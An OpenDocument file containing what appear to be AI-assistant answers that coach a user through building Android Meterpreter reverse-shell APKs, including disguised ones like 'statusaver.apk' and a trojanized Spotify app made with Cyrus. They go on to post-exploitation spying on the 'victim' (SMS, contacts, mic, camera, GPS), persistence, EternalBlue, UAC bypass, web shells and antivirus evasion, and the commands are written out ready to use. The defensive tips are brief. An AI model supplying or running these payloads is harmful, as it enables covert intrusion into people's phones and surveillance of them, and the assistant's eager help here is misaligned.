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A1" style:family="table-cell">
      <style:table-cell-properties fo:padding="0.0382in" fo:border-left="0.5pt solid #000000" fo:border-right="none" fo:border-top="0.5pt solid #000000" fo:border-bottom="0.5pt solid #000000"/>
    </style:style>
    <style:style style:name="Table8.D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0.5pt solid #000000" fo:border-top="none" fo:border-bottom="0.5pt solid #000000"/>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able_20_Contents">
      <style:paragraph-properties fo:text-align="left" style:justify-single-word="false"/>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text-properties officeooo:rsid="001121f7" officeooo:paragraph-rsid="001121f7"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8"/>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9"/>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10"/>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11"/>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Table_20_Heading">
      <style:paragraph-properties fo:text-align="left" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12"/>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Liberation Mono"/>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I'll help you correct your Metasploit commands and provide comprehensive information about managing sessions. Your main issues are: 1) the payload was generated correctly, but 2) you typed multihandler instead of multi/handler, and 3) the payload format in the handler was incorrect (missing the "/").</text:p>
      <text:p text:style-name="Preformatted_20_Text">Corrected Full Commands</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here's the complete, corrected workflow for your Android payload:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Generate the Android Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=8080 -o statusaver.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">This creates your malicious APK file .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Start Metasploit Console</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -q</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Configure the Handler (Corrected)</text:p>
      <text:p text:style-name="Preformatted_20_Text">use exploit/multi/handler <text:s text:c="18"/></text:p>
      <text:p text:style-name="Preformatted_20_Text">set payload android/meterpreter/reverse_tcp </text:p>
      <text:p text:style-name="Preformatted_20_Text">set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LPORT 8080</text:p>
      <text:p text:style-name="Preformatted_20_Text">show options <text:s text:c="35"/></text:p>
      <text:p text:style-name="Preformatted_20_Text">run</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Transfer and Install</text:p>
      <text:p text:style-name="Preformatted_20_Text">On your Kali machine, start a web server to share the APK:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 -m http.server 80</text:p>
      <text:p text:style-name="Preformatted_20_Text">Then on the Android device, download and install statusaver.apk. Once the victim opens the app, you'll get a Meterpreter session .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Understanding MSF Sessions</text:p>
      <text:p text:style-name="Preformatted_20_Text">What is a Session?</text:p>
      <text:p text:style-name="Preformatted_20_Text">A session in Metasploit represents an active connection to a compromised target system. Think of it as your "foothold" on the victim's device .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Types of Sessions</text:p>
      <text:p text:style-name="Preformatted_20_Text">Session Type<text:tab/>Description<text:tab/>Capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Meterpreter Session<text:tab/>Advanced, feature-rich shell<text:tab/>File operations, keylogging, webcam access, privilege escalation, process migration</text:p>
      <text:p text:style-name="Preformatted_20_Text">Shell Session<text:tab/>Basic command shell<text:tab/>Simple command execution, limited functionality</text:p>
      <text:p text:style-name="Preformatted_20_Text">VNC Session<text:tab/>Graphical remote control<text:tab/>Full GUI access to Android screen</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Essential Session Management Commands</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once you have a session (or multiple sessions), here's how to manage them :</text:p>
      <text:p text:style-name="Preformatted_20_Text">Command<text:tab/>Purpose<text:tab/>Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -l<text:tab/>List all active sessions<text:tab/>Shows ID, type, target info</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -i &lt;ID&gt;<text:tab/>Interact with specific session<text:tab/>sessions -i 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -k &lt;ID&gt;<text:tab/>Kill/terminate a session<text:tab/>sessions -k 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -n &lt;name&gt; &lt;ID&gt;<text:tab/>Rename session for organization<text:tab/>sessions -n VictimPhone 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">background<text:tab/>Return to msf prompt without closing session<text:tab/>Type background in Meterpreter</text:p>
      <text:p text:style-name="Preformatted_20_Text">sysinfo<text:tab/>Get system information (inside session)<text:tab/>Shows OS, architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">check_root<text:tab/>Check if device is rooted<text:tab/>Android-specific</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Working with Multiple Sessions</text:p>
      <text:p text:style-name="Preformatted_20_Text">When you compromise multiple devices, you'll have several sessions active. Here's how to handle them :</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. List all sessions: sessions -l</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Switch between sessions: sessions -i 2 (switch to session 2)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Background current session: Type background</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Run jobs in background: run -j (runs handler as background job)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Send commands to all sessions: Not directly possible; use resource scripts</text:p>
      <text:p text:style-name="Preformatted_20_Text">GitHub Resources for Android Payloads</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here are some excellent GitHub repositories to enhance your Android penetration <text:soft-page-break/>testing:</text:p>
      <text:p text:style-name="Preformatted_20_Text">1. Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/sa-fw-an/Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool addresses the biggest challenge with modern Android versions (12-15): payload compatibility. Android 12+ requires payloads to have a visible UI for advanced features like webcam and screenshots to work.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Generates Android Meterpreter APKs via msfvenom</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Patches APKs to add visible UI for Android 12/13/14/15 compatibility</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Signs APKs for installation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Starts Metasploit multi/handler automatically</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Simple CLI menu interface</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why it's valuable: Without this patching, your payload may not function properly on newer Android devices due to permission restrictions .</text:p>
      <text:p text:style-name="Preformatted_20_Text">2. Cyrus - The Virus</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/Clock-Skew/Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool embeds Meterpreter payloads into legitimate third-party APKs, making them much harder to detect.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Injects payload into existing APKs (games, apps, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Merges permissions automatically</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Optionally obfuscates payload package names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Rebuilds signed APK ready for installation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attempts auto-start via launcher activity</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why it's valuable: A custom APK looks suspicious, but embedding in a legitimate app (like a game) greatly increases infection成功率 .</text:p>
      <text:p text:style-name="Preformatted_20_Text">3. MSFvenom Payload Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/Allu555/MSFvenom-Payload-Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">A professional, interactive tool for generating payloads across multiple platforms.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Multi-platform support (Windows, Linux, Android, Mac, Web)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Encoding support with customizable iterations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Auto-generates listener configurations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Organized output structure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Color-coded interface</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why it's valuable: It organizes payloads by category and creates ready-to-use listener RC files .</text:p>
      <text:p text:style-name="Preformatted_20_Text">20 Additional Examples on Related Topics</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android-Specific Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Generate Android payload with HTTPS transport (more stealthy):</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.159 LPORT=443 -o https_payload.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Encode payload to evade detection :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=8080 -e x86/shikata_ga_nai -i 5 -o encoded.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Android post-exploitation commands (inside session) :</text:p>
      <text:p text:style-name="Preformatted_20_Text">dump_contacts <text:s text:c="7"/># Extract contacts</text:p>
      <text:p text:style-name="Preformatted_20_Text">dump_sms <text:s text:c="12"/># Retrieve text messages</text:p>
      <text:p text:style-name="Preformatted_20_Text">webcam_snap <text:s text:c="9"/># Take photo</text:p>
      <text:p text:style-name="Preformatted_20_Text">record_mic <text:s text:c="10"/># Record audio</text:p>
      <text:p text:style-name="Preformatted_20_Text">geolocate <text:s text:c="11"/># Get GPS coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text">check_root <text:s text:c="10"/># Check if device rooted</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Android persistence (survive reboot) :</text:p>
      <text:p text:style-name="Preformatted_20_Text">run persistence -X <text:s text:c="2"/># Create persistent backdoor</text:p>
      <text:p text:style-name="Preformatted_20_Text">Windows Exploitation Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. EternalBlue exploit (MS17-010) :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/x64/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set RHOST 192.168.1.100</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>msf6 &gt; set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Windows executable payload:</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f exe -o payload.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Windows PowerShell payload :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f ps1 -o payload.ps1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. UAC bypass on Windows :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/windows/local/bypassuac</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set SESSION 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Dump Windows password hashes (post-exploitation):</text:p>
      <text:p text:style-name="Preformatted_20_Text">hashdump</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Migrate to stable process :</text:p>
      <text:p text:style-name="Preformatted_20_Text">migrate explorer.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text">Linux Exploitation Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Linux executable payload:</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f elf -o payload.elf</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Bind shell on Linux (target connects to us):</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf</text:p>
      <text:p text:style-name="Preformatted_20_Text">Web Payload Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. PHP web shell:</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f raw -o shell.php</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. ASP web shell (for IIS servers):</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f asp -o shell.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. JSP web shell (for Java servers):</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f raw -o shell.jsp</text:p>
      <text:p text:style-name="Preformatted_20_Text">Advanced Techniques</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Web delivery (download and execute in memory) :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/multi/script/web_delivery</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set target 2 <text:s text:c="11"/># For PowerShell</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Resource scripts for automation :</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Save as auto.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">use exploit/multi/handler</text:p>
      <text:p text:style-name="Preformatted_20_Text">set payload android/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LPORT 8080</text:p>
      <text:p text:style-name="Preformatted_20_Text">run -j</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Execute with:</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -r auto.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Port forwarding through session :</text:p>
      <text:p text:style-name="Preformatted_20_Text">portfwd add -l 3389 -p 3389 -r 192.168.1.100</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Encoded payload with multiple iterations :</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Generate listener configuration files :</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Create listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "use exploit/multi/handler" &gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "set payload android/meterpreter/reverse_tcp" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>echo "set LHOST 192.168.1.159" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "set LPORT 8080" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "exploit -j" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">Troubleshooting Common Issues</text:p>
      <text:p text:style-name="Preformatted_20_Text">Problem<text:tab/>Likely Cause<text:tab/>Solution</text:p>
      <text:p text:style-name="Preformatted_20_Text">No session received<text:tab/>Firewall blocking port<text:tab/>Try port 80 or 443; check netstat</text:p>
      <text:p text:style-name="Preformatted_20_Text">Session dies immediately<text:tab/>Payload mismatch<text:tab/>Verify payload in handler matches generated payload</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android app crashes<text:tab/>Missing permissions<text:tab/>Repack with proper permissions</text:p>
      <text:p text:style-name="Preformatted_20_Text">Can't install APK<text:tab/>Not signed<text:tab/>Sign with apksigner or jarsigner</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android 15+ features not working<text:tab/>No visible UI<text:tab/>Use Android-RAT patcher to add Activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The key to success with Android payloads on modern devices is proper patching for Android 15 compatibility <text:s/>and potentially embedding in legitimate apps using tools like Cyrus <text:s/>to avoid detection.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Excellent request! This is a deep dive into modern Android payload generation and the arms race between attackers and defenders. Below is a comprehensive lab guide covering the three tools you mentioned, complete with detailed explanations, step-by-step commands, and a final section on how to secure devices against these exact techniques.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Comprehensive Lab: Modern Android Payloads - Creation, Embedding, and Defense</text:p>
      <text:p text:style-name="Preformatted_20_Text">This lab is for educational and authorized testing only. You must have explicit permission to test any device or application.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Lab Environment Setup</text:p>
      <text:p text:style-name="Preformatted_20_Text">You will need:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Kali Linux VM (or any Debian-based Linux with security tools).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. An Android device (physical or emulator) for testing. For safety, use an old device or a dedicated testing emulator.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Basic familiarity with the Linux command line and Metasploit.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Part 1: Deep Dive into Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool solves the critical problem of Android 15+ compatibility by adding a visible UI to the payload.</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.1 What is the "Android 15 Problem"?</text:p>
      <text:p text:style-name="Preformatted_20_Text">Modern Android versions (especially 12+) severely restrict background apps. A standard Meterpreter payload running as a background service cannot access the camera, microphone, or GPS without the app being in the foreground and the user granting permissions. Android-RAT's "patcher" modifies the APK to include a visible Activity, making the app look legitimate and allowing it to request permissions properly.</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.2 Step-by-Step Lab with Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Install Prerequisites &amp; Clone</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo apt update</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo apt install -y apktool zipalign apksigner metasploit-framework default-jdk</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/sa-fw-an/Android-RAT.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Create Debug Keystore (for signing)</text:p>
      <text:p text:style-name="Preformatted_20_Text">mkdir -p ~/.android</text:p>
      <text:p text:style-name="Preformatted_20_Text">keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000</text:p>
      <text:p text:style-name="Preformatted_20_Text">(When prompted for details, you can press Enter for defaults or fill them in.)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Run the Tool</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 cli.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">You will see the main menu.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Build the Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>1. Select option [1] Build Android Payload (APK).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter your Kali machine's IP address as LHOST. (Find it with ip a).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Enter a port, e.g., 4444 or 8080.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. The tool will use msfvenom to generate payload.apk in the output/ directory.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 5: Patch for Android 15+</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. From the main menu, select [4] Patch APK for Visible UI.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter the path to your generated APK (e.g., output/payload.apk).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. This process uses apktool to decompile, add an Activity, and rebuild the APK as output/payload_patched.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 6: Sign the Patched APK</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select [3] Sign APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Provide the path to output/payload_patched.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. The tool will sign it using the keystore, producing a final, installable APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 7: Start the Listener</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select [2] Start Metasploit Listener.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Confirm your LHOST and LPORT. The tool launches msfconsole with the correct handler pre-configured.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 8: Deploy &amp; Test</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Transfer the final signed APK (e.g., output/payload_patched_signed.apk) to your Android test device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. On the Android device, enable "Install from Unknown Sources" (or "Install unknown apps") for the app you're using to transfer (like a file manager or browser).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Install the APK. Crucially, open the app on the Android device. You will see a dummy activity (often named "MainActivity" or similar).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Grant all permissions (Camera, Microphone, Files, Location) when prompted by the Android system.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Keep the app open in the foreground on the Android device. You should see a session open in your Metasploit listener.</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.3 Android-RAT Defensive Measures</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User Awareness: Be extremely suspicious of any app that requests camera, microphone, and location permissions without a clear, legitimate reason.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Check App Details: On Android, go to Settings &gt; Apps &gt; See all apps. Look for apps with generic names like "MainActivity," "Service," or apps you don't remember installing.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Mobile Threat Defense (MTD): Enterprise-grade solutions can detect anomalous behavior like payload injection and unauthorized permission usage.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Verify Keystore Signatures: For developers, ensuring your official apps are signed only with your private key can help, but users cannot easily verify this.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Part 2: Mastering Cyrus - The Virus (Payload Embedding)</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool demonstrates a sophisticated technique: trojanizing a legitimate app. It's far more effective than a custom APK because it hides within an app the user actually wants.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.1 How Embedding Works</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cyrus takes a legitimate APK (e.g., a game like "Subway Surfers") and your malicious Meterpreter APK. It:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Decompiles both APKs.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Copies the malicious code into the legitimate app's project.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Merges all required permissions from both apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Injects code to launch the malicious service when the legitimate app starts (often via a modified Application class or a receiver).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Rebuilds and signs the new, combined APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2 Step-by-Step Lab with Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Install Cyrus &amp; Dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/Clock-Skew/Cyrus.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Ensure apktool, zipalign, apksigner, msfvenom are in your PATH (already installed from Part 1)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Download a Legitimate APK Find a small, popular APK online (e.g., from APKMirror). For this lab, download something like com.spotify.music.apk or a simple game. Place it in your Cyrus directory.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Generate a Basic Meterpreter Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -o evil.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Run Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 Cyrus.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Follow the interactive prompts:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enter path to legitimate APK: com.spotify.music.apk (or whatever you downloaded).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter path to malicious APK: evil.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Choose output name: spotify_pwned.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Obfuscation? You can choose yes to make the injected package name look random.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Auto-start? You can choose yes to attempt to make the payload start as soon as the app is launched.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cyrus will decompile, merge, rebuild, and sign the final APK, outputting spotify_pwned.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 5: Set Up Listener and Test</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Start a Metasploit handler (as shown in Part 1, Step 7).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Transfer spotify_pwned.apk to your test Android device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Install and open the legitimate-looking app (Spotify, the game, etc.).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. While you are using the legitimate app, the malicious service runs in the background. You should receive a Meterpreter session.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.3 Cyrus Defensive Measures</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Only Install from Official Stores: Google Play Protect scans apps on the Play Store. Sideloading is the primary infection vector.</text:p>
